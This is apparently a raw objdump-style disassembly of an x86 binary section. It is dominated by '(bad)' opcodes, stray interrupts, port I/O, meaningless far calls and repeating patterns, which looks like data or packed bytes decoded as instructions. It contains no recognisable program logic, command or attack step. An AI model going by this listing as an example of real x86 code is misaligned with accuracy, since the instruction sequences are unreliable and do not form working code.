  426115:	push   ebx
  426116:	aad    0x87
  426118:	adc    ecx,ebp
  42611a:	xchg   esi,eax
  42611b:	cmc    
  42611c:	sar    DWORD PTR [ecx-0x62932d8],cl
  426122:	das    
  426123:	inc    ebp
  426124:	sti    
  426125:	xchg   edx,eax
  426126:	shr    edi,cl
  426128:	xchg   edx,eax
  426129:	int    0xd6
  42612b:	cmc    
  42612c:	cmp    ebx,ecx
  42612e:	int    0xe6
  426130:	stc    
  426131:	cmp    eax,DWORD PTR [eax]
  426133:	push   ebx
  426134:	fld    DWORD PTR [edi+0x707113]
  42613a:	(bad)  
  42613b:	dec    esp
  42613c:	sar    DWORD PTR [ecx-0x12c242d8],cl
  426142:	add    BYTE PTR [eax],al
  426144:	int    0x76
  426146:	or     eax,0xcb63a8aa
  42614b:	rcl    BYTE PTR [eax-0x80],cl
  42614e:	xchg   esi,eax
  42614f:	int    0xed
  426151:	add    al,0xed
  426153:	inc    esp
  426154:	pop    ebx
  426155:	cwde   
  426156:	call   0x76c9:0xcb3bdd3b
  42615d:	popf   
  42615e:	(bad)  
  42615f:	aaa    
  426160:	ficom  WORD PTR [ebx]
  426162:	pop    ebp
  426163:	mov    ebp,0xa25230a
  426168:	jbe    0x42610f
  42616a:	leave  
  42616b:	jbe    0x42612a
  42616d:	xchg   ecx,eax
  42616e:	aaa    
  42616f:	ficom  WORD PTR [ebx]
  426171:	or     dh,BYTE PTR [esi-0x13]
  426174:	leave  
  426175:	jbe    0x426164
  426177:	dec    ecx
  426178:	mov    al,ds:0x76c93586
  42617d:	cmc    
  42617e:	dec    ecx
  42617f:	lahf   
  426180:	xchg   BYTE PTR ds:0x691176c9,dh
  426186:	and    DWORD PTR [esi+0x1176c935],eax
  42618c:	cmp    DWORD PTR [ecx],esp
  42618e:	xchg   BYTE PTR ds:0x49f976c9,dh
  426194:	and    DWORD PTR [ebp+esi*1+0xa8476cf],eax
  42619b:	jbe    0x426196
  42619d:	int    0x76
  42619f:	sbb    al,0xcd
  4261a1:	shl    BYTE PTR ds:0xcd808081,1
  4261a7:	jbe    0x4261c5
  4261a9:	int    0x8d
  4261ab:	sbb    al,0xcd
  4261ad:	add    DWORD PTR ds:0xcd808081,ebp
  4261b3:	xor    ch,cl
  4261b5:	pop    esp
  4261b6:	xchg   eax,esp
  4261b8:	fs int 0x96
  4261bb:	popf   
  4261bc:	int    0xa
  4261be:	and    eax,0xa808081
  4261c3:	out    0xb5,al
  4261c5:	int    0xe6
  4261c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261c8:	das    
  4261c9:	inc    ebp
  4261ca:	add    edx,DWORD PTR [edx-0x326def2d]
  4261d0:	out    0x9d,al
  4261d2:	int    0xa6
  4261d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261d5:	adc    bh,bl
  4261d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4261d8:	mov    esi,0xdd3b4229
  4261dd:	shr    ecx,cl
  4261df:	sub    ch,cl
  4261e1:	pop    esi
  4261e2:	push   ebx
  4261e3:	aad    0x43
  4261e5:	(bad)  
  4261e7:	nop
  4261e8:	int    0x18
  4261ea:	or     dl,BYTE PTR [esi+0x1496cdf9]
  4261f0:	int    0x96
  4261f2:	xor    ch,cl
  4261f4:	xchg   esi,eax
  4261f5:	dec    esp
  4261f6:	iret   
  4261f7:	xchg   esi,eax
  4261f8:	lods   eax,DWORD PTR ds:[esi]
  4261f9:	bound  eax,QWORD PTR [eax]
  4261fb:	(bad)  
  4261fc:	stc    
  4261fd:	jno    0x42626f
  4261ff:	cwde   
  426200:	add    dh,dl
  426202:	sbb    al,0xcf
  426204:	jbe    0x4261bb
  426206:	add    dh,dl
  426208:	mov    BYTE PTR [eax],al
  42620a:	(bad)  
  42620b:	cmc    
  42620c:	add    dh,dl
  42620e:	adc    DWORD PTR [eax],eax
  426210:	(bad)  
  426211:	in     eax,dx
  426212:	jo     0x4261e3
  426214:	jbe    0x426213
  426216:	jo     0x4261d5
  426218:	stos   BYTE PTR es:[edi],al
  426219:	clc    
  42621a:	add    BYTE PTR [eax],al
  42621c:	or     dh,BYTE PTR [esi+0x1c]
  42621f:	int    0x76
  426221:	sbb    al,0xcd
  426223:	lea    esp,[edx+ecx*1]
  426226:	outs   dx,BYTE PTR ds:[esi]
  426227:	adc    al,0xcd
  426229:	jbe    0x42624f
  42622b:	leave  
  42622c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426233:	lods   eax,DWORD PTR ds:[esi]
  426234:	int    0x8d
  426236:	and    al,0xa
  426238:	outs   dx,BYTE PTR ds:[esi]
  426239:	test   ch,cl
  42623b:	jbe    0x42626d
  42623d:	int    0x8d
  42623f:	and    al,0xa
  426241:	outs   dx,BYTE PTR ds:[esi]
  426242:	mov    ch,cl
  426244:	jbe    0x42625a
  426246:	int    0x8d
  426248:	and    al,0xa
  42624a:	outs   dx,BYTE PTR ds:[esi]
  42624b:	dec    esp
  42624c:	int    0x76
  42624e:	and    al,0xc9
  426250:	ins    BYTE PTR es:[edi],dx
  426251:	and    al,0x81
  426253:	add    BYTE PTR [eax-0x32e11380],0x76
  42625a:	sbb    al,0xcd
  42625c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426263:	or     ch,0xa
  426266:	and    eax,0xcd808081
  42626b:	xor    BYTE PTR [ebx],0x81
  42626e:	or     dh,BYTE PTR [esi-0x3]
  426271:	int    0x76
  426273:	std    
  426274:	stos   BYTE PTR es:[edi],al
  426275:	test   al,0x63
  426277:	retf   
  426278:	rcr    BYTE PTR [eax+eax*4],cl
  42627b:	xchg   esi,eax
  42627c:	int    0xed
  42627e:	int    0x76
  426280:	dec    esp
  426281:	adc    ch,ch
  426283:	cmp    eax,0x5b808081
  426288:	cwde   
  426289:	call   0x2f35:0x86214966
  426290:	push   es
  426291:	mov    ecx,0xcd80804a
  426296:	jbe    0x4262c8
  426298:	inc    cx
  42629a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  4262a0:	dec    edx
  4262a1:	add    BYTE PTR [eax-0x29128937],0x37
  4262a8:	ficom  WORD PTR [ebx]
  4262aa:	pop    ebp
  4262ab:	mov    ebp,0xa25230a
  4262b0:	jbe    0x4262c3
  4262b2:	leave  
  4262b3:	jbe    0x42626a
  4262b5:	xchg   ecx,eax
  4262b6:	aaa    
  4262b7:	ficom  WORD PTR [ebx]
  4262b9:	or     dh,BYTE PTR [esi-0x43]
  4262bc:	int    0x76
  4262be:	mov    BYTE PTR [edx],cl
  4262c0:	jbe    0x4262b7
  4262c2:	int    0x76
  4262c4:	cmc    
  4262c5:	int    0x1
  4262c7:	mov    ebp,0xcd808081
  4262cc:	or     ch,0x80
  4262cf:	or     dh,BYTE PTR [esi-0x7]
  4262d2:	pop    edi
  4262d3:	jle    0x42630a
  4262d5:	add    BYTE PTR [eax-0x7fca69a3],0x80
  4262dc:	mov    eax,0x4b0760a
  4262e1:	ins    DWORD PTR es:[edi],dx
  4262e2:	(bad)  
  4262e3:	mov    eax,0xcda2760a
  4262e8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262ee:	(bad)  
  4262ef:	xor    eax,0xf1cd8080
  4262f4:	mov    eax,0xcf19960a
  4262f9:	nop
  4262fa:	xchg   edx,eax
  4262fb:	iret   
  4262fc:	sahf   
  4262fd:	(bad)  
  4262fe:	int    0x99
  426300:	mov    eax,0xcd1d960a
  426305:	aad    0xb8
  426307:	or     dl,BYTE PTR [esi-0x662dfbdf]
  42630d:	mov    eax,0xcf01960a
  426312:	jno    0x426368
  426314:	int    0x3
  426316:	mov    eax,0x40be60a
  42631b:	leave  
  42631c:	xchg   ebp,eax
  42631d:	mov    eax,0xcf05e60a
  426322:	ficomp WORD PTR [eax-0x48]
  426325:	or     ah,dh
  426327:	pop    es
  426328:	mov    eax,0xb809760a
  42632d:	or     dl,dh
  42632f:	retf   0xc5cd
  426332:	mov    eax,0xb8cc760a
  426337:	or     dl,BYTE PTR [edi]
  426339:	ins    BYTE PTR es:[edi],dx
  42633a:	add    BYTE PTR [eax],al
  42633c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426343:	push   edx
  426344:	add    BYTE PTR [eax],al
  426346:	add    bh,cl
  426348:	outs   dx,BYTE PTR ds:[esi]
  426349:	add    edi,DWORD PTR [eax+0x74060a]
  42634f:	add    BYTE PTR [eax],al
  426351:	add    al,0x6d
  426353:	inc    edx
  426354:	mov    eax,0x78060a
  426359:	add    BYTE PTR [eax],al
  42635b:	iret   
  42635c:	outs   dx,BYTE PTR ds:[esi]
  42635d:	xor    BYTE PTR [eax+0x7c060a],bh
  426363:	add    BYTE PTR [eax],al
  426365:	add    al,0x6d
  426367:	xor    bh,BYTE PTR [eax+0x8a060a]
  42636d:	add    BYTE PTR [eax],al
  42636f:	mov    eax,0x8ccf0a
  426374:	add    BYTE PTR [eax],al
  426376:	int    0xc5
  426378:	mov    eax,0x8e060a
  42637d:	add    BYTE PTR [eax],al
  42637f:	int    0x76
  426381:	in     eax,dx
  426382:	int    0x8d
  426384:	adc    DWORD PTR [edi],ebp
  426386:	inc    ebp
  426387:	jge    0x42631b
  426389:	shr    ebx,cl
  42638b:	xchg   edx,eax
  42638c:	int    0x8d
  42638e:	in     eax,dx
  42638f:	int    0x96
  426391:	adc    ebx,eax
  426393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426394:	mov    esi,0xc93b4229
  426399:	cmp    ebx,edx
  42639b:	shl    edx,cl
  42639d:	sub    BYTE PTR [ebx-0x2e],dl
  4263a0:	in     al,dx
  4263a1:	outs   dx,BYTE PTR ds:[esi]
  4263a2:	iret   
  4263a3:	aam    0x76
  4263a5:	mov    al,0xb8
  4263a7:	int    0x4e
  4263a9:	das    
  4263aa:	mov    ebx,0xcbbb2f18
  4263af:	cmp    ecx,DWORD PTR [edx+edx*1]
  4263b2:	sti    
  4263b3:	and    DWORD PTR ds:0xf3e38080,esi
  4263b9:	shl    edx,cl
  4263bb:	das    
  4263bc:	push   ebx
  4263bd:	adc    ecx,DWORD PTR [ecx]
  4263bf:	int3   
  4263c0:	test   DWORD PTR [ebp-0x32ffff01],esp
  4263c6:	lea    esi,[ebp+0x2fbd96cd]
  4263cc:	inc    ebp
  4263cd:	jecxz  0x426361
  4263cf:	shl    ebx,cl
  4263d1:	xchg   edx,eax
  4263d2:	int    0x96
  4263d4:	mov    ch,0xcd
  4263d6:	(bad)  
  4263d7:	mov    ebp,0xf73bf03b
  4263dc:	push   ebx
  4263dd:	psrlq  mm5,mm2
  4263e0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263e6:	(bad)  
  4263e7:	popa   
  4263e8:	int    0x76
  4263ea:	in     eax,dx
  4263eb:	int    0x8d
  4263ed:	adc    DWORD PTR [edi],ebp
  4263ef:	inc    ebp
  4263f0:	jge    0x426384
  4263f2:	shr    ebx,cl
  4263f4:	xchg   edx,eax
  4263f5:	int    0x8d
  4263f7:	in     eax,dx
  4263f8:	int    0x96
  4263fa:	adc    DWORD PTR [ebx],edi
  4263fc:	leave  
  4263fd:	cmp    ebx,edx
  4263ff:	shl    edx,cl
  426401:	sub    BYTE PTR [ebx-0x2e],dl
  426404:	in     al,dx
  426405:	outs   dx,BYTE PTR ds:[esi]
  426406:	iret   
  426407:	aam    0x76
  426409:	add    DWORD PTR [eax-0x44d0b133],edi
  42640f:	sbb    BYTE PTR [edi],ch
  426411:	mov    ebx,0x120c3bcb
  426416:	sti    
  426417:	and    DWORD PTR ds:0xf3e38080,esi
  42641d:	shl    edx,cl
  42641f:	das    
  426420:	push   ebx
  426421:	adc    ecx,DWORD PTR [ecx]
  426423:	int3   
  426424:	test   esp,ecx
  426426:	inc    DWORD PTR [eax]
  426428:	add    ch,cl
  42642a:	lea    esi,[ebp+0x2fbd96cd]
  426430:	inc    ebp
  426431:	jecxz  0x4263c5
  426433:	shl    ebx,cl
  426435:	xchg   edx,eax
  426436:	int    0x96
  426438:	mov    ch,0xcd
  42643a:	(bad)  
  42643b:	mov    ebp,0xf73bf03b
  426440:	push   ebx
  426441:	psrlq  mm5,mm2
  426444:	sub    BYTE PTR [edi-0x7406fb2d],al
  42644a:	(bad)  
  42644b:	popa   
  42644c:	int    0x76
  42644e:	in     eax,dx
  42644f:	int    0x8d
  426451:	adc    DWORD PTR [edi],ebp
  426453:	inc    ebp
  426454:	jge    0x4263e8
  426456:	shr    ebx,cl
  426458:	xchg   edx,eax
  426459:	int    0x8d
  42645b:	in     eax,dx
  42645c:	int    0x96
  42645e:	adc    DWORD PTR [ebx],edi
  426460:	leave  
  426461:	cmp    ebx,edx
  426463:	shl    edx,cl
  426465:	sub    BYTE PTR [ebx-0x2e],dl
  426468:	in     al,dx
  426469:	je     0x42643a
  42646b:	push   ebp
  42646c:	jbe    0x4264da
  42646e:	add    BYTE PTR [eax],al
  426470:	add    BYTE PTR [eax-0x44d0b133],bh
  426476:	sbb    BYTE PTR [edi],ch
  426478:	mov    ebx,0x120c3bcb
  42647d:	sti    
  42647e:	and    DWORD PTR ds:0xf3e38080,esi
  426484:	shl    edx,cl
  426486:	das    
  426487:	push   ebx
  426488:	adc    ecx,DWORD PTR [ecx]
  42648a:	int3   
  42648b:	test   DWORD PTR ds:0xcd0000ff,eax
  426491:	lea    esi,[ebp+0x2fbd96cd]
  426497:	inc    ebp
  426498:	jecxz  0x42642c
  42649a:	shl    ebx,cl
  42649c:	xchg   edx,eax
  42649d:	int    0x96
  42649f:	mov    ch,0xcd
  4264a1:	(bad)  
  4264a2:	mov    ebp,0xf73bf03b
  4264a7:	push   ebx
  4264a8:	psrlq  mm5,mm2
  4264ab:	sub    BYTE PTR [edi-0x7706fb2d],al
  4264b1:	(bad)  
  4264b2:	mov    ebx,0xffb506cf
  4264b7:	add    BYTE PTR [eax],al
  4264b9:	or     dh,BYTE PTR [esi-0x7]
  4264bc:	int    0x76
  4264be:	stc    
  4264bf:	pop    edi
  4264c0:	inc    esi
  4264c1:	pop    esp
  4264c2:	inc    ebp
  4264c3:	xchg   edi,eax
  4264c4:	or     cl,BYTE PTR [eax+0x79245161]
  4264ca:	daa    
  4264cb:	or     dh,BYTE PTR [eax-0x7c]
  4264ce:	int    0x6
  4264d0:	mov    ch,0xff
  4264d2:	add    BYTE PTR [eax],al
  4264d4:	int    0x57
  4264d6:	mov    ebp,0xa0000ff
  4264db:	(bad)  
  4264dc:	mov    ebp,0x8621d169
  4264e1:	xor    eax,0x62fd343
  4264e6:	pusha  
  4264e7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264f1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264f8:	mov    eax,0xfff9060a
  4264fd:	add    BYTE PTR [eax],al
  4264ff:	int    0xc5
  426501:	mov    eax,0xff03060a
  426506:	add    BYTE PTR [eax],al
  426508:	pop    ebp
  426509:	es xor eax,0xab88080
  42650f:	push   es
  426510:	std    
  426511:	inc    DWORD PTR [eax]
  426513:	add    BYTE PTR [ebp-0x5d],bl
  426516:	xor    eax,0xab88080
  42651b:	push   es
  42651c:	(bad)  
  42651d:	inc    DWORD PTR [eax]
  42651f:	add    BYTE PTR [ebp+0x1e],bl
  426522:	xor    eax,0xab88080
  426527:	push   es
  426528:	add    BYTE PTR [eax],0x0
  42652b:	add    BYTE PTR [ebp*2-0x47823218],al
  426532:	or     cl,bh
  426534:	xchg   edx,eax
  426535:	add    BYTE PTR [eax],al
  426537:	add    ch,cl
  426539:	jbe    0x42656b
  42653b:	pop    edi
  42653c:	dec    ebx
  42653d:	xor    eax,0xab88080
  426542:	iret   
  426543:	test   BYTE PTR [eax],al
  426545:	add    BYTE PTR [eax],al
  426547:	add    al,0xd3
  426549:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42654f:	add    BYTE PTR [eax],al
  426551:	pop    edi
  426552:	push   esi
  426553:	xor    eax,0xab88080
  426558:	iret   
  426559:	mov    BYTE PTR [eax],al
  42655b:	add    BYTE PTR [eax],al
  42655d:	add    al,0xd3
  42655f:	pushf  
  426560:	mov    eax,0x4acf0a
  426565:	add    BYTE PTR [eax],al
  426567:	int    0xc
  426569:	mov    eax,0x4ccf0a
  42656e:	add    BYTE PTR [eax],al
  426570:	pop    edi
  426571:	add    al,0x35
  426573:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42657a:	add    BYTE PTR [eax],al
  42657c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42657f:	adc    DWORD PTR [eax-0x80],edx
  426582:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426589:	add    bl,dl
  42658b:	mov    ebp,0x151a5f92
  426590:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426597:	add    BYTE PTR [eax],al
  426599:	pop    edi
  42659a:	call   0xcf0a:0xb88080eb
  4265a1:	adc    al,0x0
  4265a3:	add    BYTE PTR [eax],al
  4265a5:	int    0x8d
  4265a7:	xor    BYTE PTR [edx+eax*1],al
  4265aa:	call   ebx
  4265ac:	repnz sub BYTE PTR [ebx-0x2d],dl
  4265b0:	or     al,BYTE PTR [esi]
  4265b2:	adc    eax,0xcd0000ff
  4265b7:	jbe    0x426605
  4265b9:	int    0x8d
  4265bb:	dec    esp
  4265bc:	cmp    edi,DWORD PTR [ecx-0x2d]
  4265bf:	mov    ebp,0xff020492
  4265c4:	shl    edx,cl
  4265c6:	sub    BYTE PTR [ebx-0x2d],dl
  4265c9:	leave  
  4265ca:	add    eax,0xff1d06
  4265cf:	add    BYTE PTR [eax],al
  4265d1:	add    BYTE PTR [eax+0x1506cf80],al
  4265d7:	inc    DWORD PTR [eax]
  4265d9:	add    BYTE PTR [eax-0x33],dh
  4265dc:	jbe    0x42660e
  4265de:	int    0x8d
  4265e0:	xor    BYTE PTR [ebx],bh
  4265e2:	jns    0x4265b7
  4265e4:	mov    ebp,0xff020492
  4265e9:	shl    edx,cl
  4265eb:	sub    BYTE PTR [ebx-0x2d],dl
  4265ee:	jo     0x4265bf
  4265f0:	push   es
  4265f1:	stc    
  4265f2:	inc    DWORD PTR [eax]
  4265f4:	add    BYTE PTR [eax-0x33],dh
  4265f7:	jbe    0x4265ee
  4265f9:	int    0x1
  4265fb:	cmp    eax,0xc9808081
  426600:	push   es
  426601:	sbb    BYTE PTR [eax],al
  426603:	add    BYTE PTR [eax],al
  426605:	inc    eax
  426606:	retf   
  426607:	fwait
  426608:	xor    eax,0x76cd5000
  42660d:	adc    al,0x0
  42660f:	icebp  
  426610:	or     dh,BYTE PTR [esi-0x7]
  426613:	int    0x76
  426615:	stc    
  426616:	push   es
  426617:	ins    DWORD PTR es:[edi],dx
  426618:	aam    0x4a
  42661a:	adc    dl,BYTE PTR [esi+0x68]
  42661d:	or     BYTE PTR [ebx+ecx*1],bl
  426620:	fmul   QWORD PTR [ebx-0x17]
  426623:	(bad)  
  426624:	int    0x8d
  426626:	dec    esp
  426627:	int    0x96
  426629:	dec    esp
  42662a:	sar    bh,0x3b
  42662d:	setl   BYTE PTR [ebx]
  426630:	icebp  
  426631:	shr    edx,cl
  426633:	sub    bl,dl
  426635:	jmp    0x4265c9
  426637:	push   ebx
  426638:	adc    ecx,ebp
  42663a:	xchg   esi,eax
  42663b:	cmc    
  42663c:	int    0xa2
  42663e:	and    eax,0x5e808081
  426643:	dec    edx
  426644:	das    
  426645:	push   es
  426646:	popa   
  426647:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42664d:	int    0x96
  42664f:	dec    esp
  426650:	cmp    ecx,DWORD PTR [edi]
  426652:	shr    ebx,cl
  426654:	xchg   edx,eax
  426655:	cmp    esi,ecx
  426657:	shr    edx,cl
  426659:	sub    BYTE PTR [ebx+0x13],dl
  42665c:	int    0x96
  42665e:	cmc    
  42665f:	int    0xa2
  426661:	in     al,0x81
  426663:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42666a:	int    0x96
  42666c:	dec    esp
  42666d:	cmp    ecx,DWORD PTR [edi]
  42666f:	shr    ebx,cl
  426671:	xchg   edx,eax
  426672:	cmp    esi,ecx
  426674:	shr    edx,cl
  426676:	sub    BYTE PTR [ebx+0x13],dl
  426679:	int    0x96
  42667b:	cmc    
  42667c:	int    0xa2
  42667e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426684:	pop    edi
  426685:	xor    ax,0x8080
  426689:	mov    eax,0x24cf0a
  42668e:	add    BYTE PTR [eax],al
  426690:	int    0xc
  426692:	mov    eax,0x28cf0a
  426697:	add    BYTE PTR [eax],al
  426699:	pop    edi
  42669a:	es xor eax,0xab88080
  4266a0:	iret   
  4266a1:	sub    al,0x0
  4266a3:	add    BYTE PTR [eax],al
  4266a5:	pop    edi
  4266a6:	daa    
  4266a7:	xor    eax,0xab88080
  4266ac:	iret   
  4266ad:	xor    al,BYTE PTR [eax]
  4266af:	add    BYTE PTR [eax],al
  4266b1:	add    al,0xd3
  4266b3:	test   eax,0x34cf0ab8
  4266b8:	add    BYTE PTR [eax],al
  4266ba:	add    BYTE PTR [edi-0x69],bl
  4266bd:	xor    eax,0xab88080
  4266c2:	iret   
  4266c3:	cmp    BYTE PTR [eax],al
  4266c5:	add    BYTE PTR [eax],al
  4266c7:	add    al,0xd3
  4266c9:	mov    dl,0xb8
  4266cb:	or     cl,bh
  4266cd:	cmp    al,0x0
  4266cf:	add    BYTE PTR [eax],al
  4266d1:	pop    edi
  4266d2:	fwait
  4266d3:	xor    eax,0xab88080
  4266d8:	iret   
  4266d9:	inc    eax
  4266da:	add    BYTE PTR [eax],al
  4266dc:	add    ch,cl
  4266de:	or     al,0xb8
  4266e0:	or     cl,bh
  4266e2:	inc    esp
  4266e3:	add    BYTE PTR [eax],al
  4266e5:	add    BYTE PTR [edi+0x17],bl
  4266e8:	xor    eax,0xab88080
  4266ed:	iret   
  4266ee:	dec    eax
  4266ef:	add    BYTE PTR [eax],al
  4266f1:	add    BYTE PTR [edi+0x26],bl
  4266f4:	pop    esi
  4266f5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266fc:	add    BYTE PTR [eax],al
  4266fe:	pop    edi
  4266ff:	cmp    esi,DWORD PTR [edx]
  426701:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  426708:	add    BYTE PTR [eax],al
  42670a:	jns    0x426782
  42670c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42670d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42670e:	pop    edi
  42670f:	pop    esp
  426710:	adc    eax,0xab88080
  426715:	iret   
  426716:	push   esp
  426717:	add    BYTE PTR [eax],al
  426719:	add    BYTE PTR [ebx+edx*8],al
  42671c:	pop    esp
  42671d:	mov    eax,0x58cf0a
  426722:	add    BYTE PTR [eax],al
  426724:	jns    0x42679c
  426726:	fisttp WORD PTR [ecx+0x79]
  426729:	jbe    0x4266d4
  42672b:	inc    ecx
  42672c:	jns    0x4267a4
  42672e:	loope  0x4266d3
  426730:	pop    edi
  426731:	fcom   st(4)
  426733:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42673a:	add    BYTE PTR [eax],al
  42673c:	jns    0x4267b4
  42673e:	lods   eax,DWORD PTR ds:[esi]
  42673f:	push   edi
  426740:	pop    edi
  426741:	jnp    0x426798
  426743:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42674a:	add    BYTE PTR [eax],al
  42674c:	jns    0x4267c4
  42674e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426752:	jmp    0x8080:0x35a15f47
  426759:	mov    eax,0x64cf0a
  42675e:	add    BYTE PTR [eax],al
  426760:	jns    0x4267d8
  426762:	in     eax,0x18
  426764:	int    0x8d
  426766:	xor    ch,cl
  426768:	xchg   esi,eax
  426769:	xor    BYTE PTR [ebx],bh
  42676b:	(bad)  
  42676d:	icebp  
  42676e:	shr    ebx,cl
  426770:	xchg   edx,eax
  426771:	shr    edx,cl
  426773:	sub    BYTE PTR [ebx+0x13],dl
  426776:	in     al,dx
  426777:	xchg   esp,eax
  426778:	int    0x96
  42677a:	xor    ch,cl
  42677c:	out    0x30,al
  42677e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426784:	stc    
  426785:	shr    ecx,cl
  426787:	sub    BYTE PTR [ebx-0x27],dl
  42678a:	xor    edx,DWORD PTR [ebx]
  42678c:	das    
  42678d:	pop    ecx
  42678e:	mov    WORD PTR [ebp-0x5b],cs
  426791:	int    0x96
  426793:	xor    ch,cl
  426795:	out    0x30,al
  426797:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42679d:	stc    
  42679e:	shr    ecx,cl
  4267a0:	sub    BYTE PTR [ebx-0x27],dl
  4267a3:	int    0xe6
  4267a5:	stc    
  4267a6:	add    al,0x2
  4267a8:	adc    DWORD PTR [edx],0xffffffd3
  4267ab:	fwait
  4267ac:	add    BYTE PTR [eax+0x9033380],0x8c
  4267b3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4267b5:	int    0x96
  4267b7:	xor    ch,cl
  4267b9:	lea    esi,[eax]
  4267bb:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  4267c1:	sub    bl,dl
  4267c3:	repz xchg edx,eax
  4267c5:	push   ebx
  4267c6:	jecxz  0x426795
  4267c8:	(bad)  
  4267c9:	stc    
  4267ca:	xchg   DWORD PTR [ebx],edx
  4267cc:	int    0x96
  4267ce:	xor    ch,cl
  4267d0:	out    0x30,al
  4267d2:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4267d8:	xchg   edx,eax
  4267d9:	shr    ecx,cl
  4267db:	sub    BYTE PTR [ebx-0x27],dl
  4267de:	add    al,0xd2
  4267e0:	mov    BYTE PTR [edx],cl
  4267e2:	(bad)  
  4267e3:	stc    
  4267e4:	inc    ebx
  4267e5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267eb:	int    0x96
  4267ed:	xor    BYTE PTR [ebx],bh
  4267ef:	(bad)  
  4267f1:	icebp  
  4267f2:	shr    ebx,cl
  4267f4:	xchg   edx,eax
  4267f5:	shr    edx,cl
  4267f7:	sub    BYTE PTR [ebx+0x13],dl
  4267fa:	or     cl,bh
  4267fc:	adc    eax,0xcd0000ff
  426801:	lea    ecx,[ebp+ecx*8-0x6a]
  426805:	dec    esp
  426806:	cmp    ecx,DWORD PTR [edi]
  426808:	cmp    esi,ecx
  42680a:	shr    edx,cl
  42680c:	sub    bl,dl
  42680e:	jmp    0x4267a2
  426810:	push   ebx
  426811:	adc    ecx,edi
  426813:	xchg   esi,eax
  426814:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426815:	or     dl,BYTE PTR ds:0xff1dcf
  42681b:	add    BYTE PTR [ecx+0x6b],ah
  42681e:	xor    eax,0x13cd8080
  426823:	mov    eax,0x4258d0a
  426828:	rcl    edx,cl
  42682a:	int    0xfa
  42682c:	mov    eax,0xcf29e60a
  426831:	loopne 0x4267dc
  426833:	mov    eax,0x42de60a
  426838:	leave  
  426839:	test   BYTE PTR [eax-0x304d19f6],bh
  42683f:	loopne 0x426855
  426841:	mov    eax,0x435e60a
  426846:	leave  
  426847:	loop   0x426801
  426849:	or     ah,dh
  42684b:	cmp    ebp,ecx
  42684d:	cli    
  42684e:	mov    eax,0xcd3de60a
  426853:	add    edi,DWORD PTR [eax-0x32be19f6]
  426859:	cld    
  42685a:	mov    eax,0xcd45e60a
  42685f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426865:	cli    
  426866:	mov    eax,0xcfc2e60a
  42686b:	loopne 0x426896
  42686d:	mov    eax,0x455e60a
  426872:	leave  
  426873:	test   BYTE PTR [eax-0x30a619f6],bh
  426879:	loopne 0x426810
  42687b:	mov    eax,0x45de60a
  426880:	leave  
  426881:	loop   0x42683b
  426883:	or     ah,dh
  426885:	popa   
  426886:	mov    eax,0xb8658d0a
  42688b:	or     dl,BYTE PTR [esi-0x47f33297]
  426891:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426897:	int    0x96
  426899:	dec    esp
  42689a:	cmp    esi,ecx
  42689c:	cmp    ecx,DWORD PTR [edi]
  42689e:	shr    edx,cl
  4268a0:	sub    bl,dl
  4268a2:	jmp    0x426836
  4268a4:	push   ebx
  4268a5:	adc    ecx,ebp
  4268a7:	xchg   esi,eax
  4268a8:	dec    esp
  4268a9:	int    0xe6
  4268ab:	dec    esp
  4268ac:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  4268b2:	mov    WORD PTR [ebp-0x2c06c430],cs
  4268b8:	jmp    0x301bbbe5
  4268bd:	mov    ebx,0xb8d93b5e
  4268c2:	or     dh,BYTE PTR [ecx]
  4268c4:	int    0x8d
  4268c6:	dec    esp
  4268c7:	int    0x96
  4268c9:	dec    esp
  4268ca:	cmp    ecx,DWORD PTR [edi]
  4268cc:	cmp    esi,ecx
  4268ce:	shr    ebx,cl
  4268d0:	xchg   edx,eax
  4268d1:	shr    edx,cl
  4268d3:	sub    BYTE PTR [ebx+0x13],dl
  4268d6:	int    0x96
  4268d8:	dec    esp
  4268d9:	iret   
  4268da:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268e0:	out    0x4c,al
  4268e2:	shl    ebx,cl
  4268e4:	xchg   edx,eax
  4268e5:	cmp    edi,ecx
  4268e7:	shr    ecx,cl
  4268e9:	sub    BYTE PTR [ebx-0x27],dl
  4268ec:	das    
  4268ed:	mov    ebx,0xb8d93b5e
  4268f2:	or     dh,BYTE PTR [ecx]
  4268f4:	int    0x8d
  4268f6:	dec    esp
  4268f7:	int    0x96
  4268f9:	dec    esp
  4268fa:	cmp    esi,ecx
  4268fc:	shr    edx,cl
  4268fe:	sub    BYTE PTR [ebx],bh
  426900:	psrlq  mm5,mm3
  426903:	xchg   edx,eax
  426904:	push   ebx
